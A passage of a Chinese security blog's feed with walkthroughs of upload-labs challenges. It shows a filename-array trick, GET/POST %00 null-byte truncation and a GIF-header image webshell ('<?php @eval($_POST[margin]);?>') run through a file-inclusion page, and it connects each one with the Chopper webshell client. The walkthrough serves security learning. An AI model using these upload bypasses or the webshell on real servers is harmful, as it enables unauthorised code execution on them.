UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; .&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件上传成功！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;请选择要上传的文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先映入眼帘就是检查了&lt;code&gt;MIME&lt;/code&gt;，所以我们必须修改&lt;code&gt;MIME&lt;/code&gt;为&lt;code&gt;image/jpeg&lt;/code&gt;来先绕过MIME检查。&lt;/p&gt;
&lt;p&gt;接着，开始检查文件名：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file&lt;/code&gt;变量要求是一个数组，即使不是也要最后通过&lt;code&gt;explode&lt;/code&gt;函数以点为分隔符变成&lt;code&gt;数组&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ext&lt;/code&gt;变量就是&lt;code&gt;file&lt;/code&gt;数组中最后一个元素，也就是`文件后缀名。&lt;/li&gt;
&lt;li&gt;判断后缀名是否在白名单内，如果在则继续执行&lt;ul&gt;
&lt;li&gt;核心：&lt;code&gt;file_name = reset($file) . &amp;#39;.&amp;#39; . $file[count($file) - 1]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;意思是&lt;code&gt;file_name&lt;/code&gt; 由&lt;code&gt;file数组第一位&lt;/code&gt;+ &lt;code&gt;.&lt;/code&gt; +&lt;code&gt;file数组最后一位&lt;/code&gt;拼接而成 【开发者只考虑了普通的xxx.jpg这样只有两个元素数组的情况】&lt;/li&gt;
&lt;li&gt;而&lt;code&gt;file数组&lt;/code&gt;可以由可控变量&lt;code&gt;save_name&lt;/code&gt;而来，&lt;code&gt;save_name&lt;/code&gt;可以一开始就是&lt;code&gt;数组&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么，我们就可以一一来绕过：&lt;/p&gt;
&lt;p&gt;修改MIME&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;form-data; name=&amp;quot;upload_file&amp;quot;; filename=&amp;quot;backdoor.php&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;image/jpeg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004155043004.png&#34; alt=&#34;image-20221004155043004&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改可控变量&lt;code&gt;save_name&lt;/code&gt;，使其变成&lt;code&gt;save_name[]&lt;/code&gt;数组，我们自定义两个元素（分别是&lt;code&gt;save_name[0]&lt;/code&gt;和&lt;code&gt;save_name[2]&lt;/code&gt;）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由于只设置了数组的&lt;code&gt;2个元素&lt;/code&gt;，所以数组长度&lt;code&gt;count($file)&lt;/code&gt;为&lt;code&gt;2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;由于&lt;code&gt;reset($file)&lt;/code&gt;输出的是&lt;code&gt;save_name[0]&lt;/code&gt;，因此，&lt;code&gt;reset($file)&lt;/code&gt;—-会输出—-&amp;gt; &lt;code&gt;33322.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;由于&lt;code&gt;$file[count($file) - 1]&lt;/code&gt;输出的是&lt;code&gt;save_name[2 - 1]&lt;/code&gt;(我们并没有设置)，因此，&lt;code&gt;$file[count($file) - 1]&lt;/code&gt;——会输出—-&amp;gt;&lt;code&gt;空&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------6270582926777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;form-data; name=&amp;quot;save_name[0]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33322.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-----------------------------6270582926777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Content-Disposition&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;form-data; name=&amp;quot;save_name[2]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;save_name[1]&lt;/code&gt;不用设置，目前的情况正好能使得&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;reset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) . &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;[&lt;span class=&#34;title function_ invoke__&#34;&gt;count&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;33322&lt;/span&gt;.php.空&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;而在windows中，空和点作为结尾，会直接删除，从而保留&lt;code&gt;33322.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004160021961.png&#34; alt=&#34;image-20221004160021961&#34;&gt;&lt;/p&gt;
&lt;p&gt;正常解析访问，菜刀也可正常连接。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004160109151.png&#34; alt=&#34;image-20221004160109151&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</guid>
            <title>特殊的文件上传漏洞（一）</title>
            <link>https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Tue, 04 Oct 2022 00:52:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;特殊的文件上传漏洞（一）&#34;&gt;&lt;a href=&#34;#特殊的文件上传漏洞（一）&#34; class=&#34;headerlink&#34; title=&#34;特殊的文件上传漏洞（一）&#34;&gt;&lt;/a&gt;特殊的文件上传漏洞（一）&lt;/h1&gt;&lt;p&gt;我们来讲讲特殊的文件上传漏洞（一）。&lt;/p&gt;
&lt;h2 id=&#34;GET-00截断绕过&#34;&gt;&lt;a href=&#34;#GET-00截断绕过&#34; class=&#34;headerlink&#34; title=&#34;GET-00截断绕过&#34;&gt;&lt;/a&gt;GET-00截断绕过&lt;/h2&gt;&lt;p&gt;Pass-11&lt;/p&gt;
&lt;p&gt;抓包，看到在请求的url上出现了敏感的字符，save_path=../upload/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003220951062.png&#34; alt=&#34;image-20221003220951062&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现这样的字样，我们首先需要想想，这个上传保存路径是否可控？&lt;/p&gt;
&lt;p&gt;首先为了上传成功首先得把backdoor.php改成&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&amp;quot;backdoor.jpg&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来我们猜想，save_path可以指定某个路径存储，我们可以让它存在别的地方嘛？&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;save_path=../ &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003221405064.png&#34; alt=&#34;image-20221003221405064&#34;&gt;&lt;/p&gt;
&lt;p&gt;确实生成了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003221432601.png&#34; alt=&#34;image-20221003221432601&#34;&gt;&lt;/p&gt;
&lt;p&gt;那也就是说，控制save_path是可行的，但想到如果save_path变成一个文件路径的话，应该会报错。果不其然&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003221709058.png&#34; alt=&#34;image-20221003221709058&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果&lt;code&gt;能有这么一种方法&lt;/code&gt;，能让save_path&lt;strong&gt;直接成为最后保存的文件路径该多好&lt;/strong&gt;，比如&lt;code&gt;save_path=../upload/11.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;虽然上传的是backdoor.jpg，但存储的时候直接就成了php格式。有办法做到么？有！答案就是GET-00截断、&lt;/p&gt;
&lt;p&gt;只需要修改：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;save_path=../upload/&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;.php%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功上传不报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003221909843.png&#34; alt=&#34;image-20221003221909843&#34;&gt;&lt;/p&gt;
&lt;p&gt;upload/11.php也生成了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003221948845.png&#34; alt=&#34;image-20221003221948845&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀正常连接。搞定！&lt;/p&gt;
&lt;p&gt;除了在url里加%00之外，有些时候，也可以在filename里加&lt;/p&gt;
&lt;p&gt;比如这样改&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.jpg+&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后在hex里找到+的位置（十六进制为2b），将其替换成00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003222306181.png&#34; alt=&#34;image-20221003222306181&#34;&gt;&lt;/p&gt;
&lt;p&gt;其实用到的原理就是：&lt;code&gt;00截断&lt;/code&gt;就是借php解析字符串的时候&lt;code&gt;遇到00截断停止，不再解析&lt;/code&gt;的特点，把文件路径提前&lt;code&gt;错误地识别成了文件&lt;/code&gt;（&lt;strong&gt;本应该是路径才对&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;这就衍生出了，post-00截断&lt;/p&gt;
&lt;h2 id=&#34;POST-00截断绕过&#34;&gt;&lt;a href=&#34;#POST-00截断绕过&#34; class=&#34;headerlink&#34; title=&#34;POST-00截断绕过&#34;&gt;&lt;/a&gt;POST-00截断绕过&lt;/h2&gt;&lt;p&gt;Pass-12&lt;/p&gt;
&lt;p&gt;save_path出现在了POST请求的参数区&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003224305275.png&#34; alt=&#34;image-20221003224305275&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们可以这样构造&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;../upload/123.php+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;filename=&amp;quot;backdoor.png&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003224407296.png&#34; alt=&#34;image-20221003224407296&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后在hex中修改+的十六进制0x2b为00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003224514879.png&#34; alt=&#34;image-20221003224514879&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003224555355.png&#34; alt=&#34;image-20221003224555355&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀也可以成功连接123.php文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003224620743.png&#34; alt=&#34;image-20221003224620743&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;图片马绕过-白名单绕过&#34;&gt;&lt;a href=&#34;#图片马绕过-白名单绕过&#34; class=&#34;headerlink&#34; title=&#34;图片马绕过(白名单绕过)&#34;&gt;&lt;/a&gt;图片马绕过(白名单绕过)&lt;/h2&gt;&lt;p&gt;Pass-13&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003230438023.png&#34; alt=&#34;image-20221003230438023&#34;&gt;&lt;/p&gt;
&lt;p&gt;本题考察对于文件头解析+图片马合成&lt;/p&gt;
&lt;h3 id=&#34;绕过文件头解析&#34;&gt;&lt;a href=&#34;#绕过文件头解析&#34; class=&#34;headerlink&#34; title=&#34;绕过文件头解析&#34;&gt;&lt;/a&gt;绕过文件头解析&lt;/h3&gt;&lt;p&gt;常用文件头：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.jpeg&lt;/code&gt;; &lt;code&gt;.jpe&lt;/code&gt;; &lt;code&gt;.jpg&lt;/code&gt;, &lt;code&gt;&amp;quot;JPGGraphic File&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.gif&lt;/code&gt;,&lt;code&gt;&amp;quot;GIF 89A&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.zip&lt;/code&gt;, &lt;code&gt;&amp;quot;Zip Compressed&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.doc&lt;/code&gt;; &lt;code&gt;.xls&lt;/code&gt;; &lt;code&gt;.xlt&lt;/code&gt;; &lt;code&gt;.ppt&lt;/code&gt;; &lt;code&gt;.apr&lt;/code&gt;, &lt;code&gt;&amp;quot;MS Compound Document v1 or Lotus Approach APRfile&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JPEG（jpg），文件头：FFD8FF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PNG（png），文件头：89504E47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GIF（gif），文件头：47494638&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Windows Bitmap（bmp），文件头：424D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CAD（dwg），文件头：41433130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Adobe Photoshop（psd），文件头：38425053&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Rich Text Format（rtf），文件头：7B5C727466&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XML（xml），文件头：3C3F786D6C&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTML（html），文件头：68746D6C3E&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Email [thorough only]（eml），文件头：44656C6976572792D646174653A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Outlook Express（dbx），文件头：CFAD12FEC5FD746F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Outlook（pst），文件头：2142444E&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ms Word/Excel（xls.or.doc），文件头：D0CF11E0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ms Access（mdb），文件头：5374616E64617264204A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WordPerfect（wpd），文件头：FF575043&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Adobe Acrobat（pdf），文件头：255044462D312E&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Quicken（qdf），文件头：AC9EBD8F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Windows Password（pwl），文件头：E3828596&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ZIP Archive（zip），文件头：504B0304&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RAR Archive（rar），文件头：52617221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Wave（wav），文件头：57415645&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AVI（avi），文件头：41564920&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Real Audio（ram），文件头：2E7261FD&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Real Media（rm），文件头：2E524D46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MPEG（mpg），文件头：000001BA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MPEG（mpg），文件头：000001B3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;QuickTime（mov），文件头：6D6F6F76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Windows Media（asf），文件头：3026B2758E66CF11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MIDI（mid），文件头：4D546864&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有些web程序会根据传上来文件的头几个字节来判断是属于什么类型，比如GIF的魔术字是&lt;code&gt;GIF 89A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们尝试在一句话木马前面增加&lt;code&gt;GIF 89A&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GIF 89A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php @eval($_POST[margin]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003232704271.png&#34; alt=&#34;image-20221003232704271&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到成功被识别成了gif而上传给了服务器&lt;/p&gt;
&lt;p&gt;我们将此路径&lt;code&gt;./upload/5020221003232644.gif&lt;/code&gt;拷贝，&lt;strong&gt;注意只拷贝一个点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;发现题目还给了一个文件包含的链接&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;本页面存在文件包含漏洞，用于测试图片马是否能正常运行！&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type:text/html;charset=utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(__file__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当前&lt;code&gt;http://www.upload_lab.com/include.php&lt;/code&gt;页面，可以接收一个&lt;code&gt;GET型参数&lt;/code&gt;&lt;strong&gt;file&lt;/strong&gt;，我们如下构造：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//www.upload_lab.com/include.php?file=./upload/5020221003232644.gif&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003233246265.png&#34; alt=&#34;image-20221003233246265&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以发现，只显示了GIF 89A，一句话木马没有显示在页面，说明成功解析成了php。&lt;/p&gt;
&lt;p&gt;菜刀连接，成功：&lt;/p&gt;
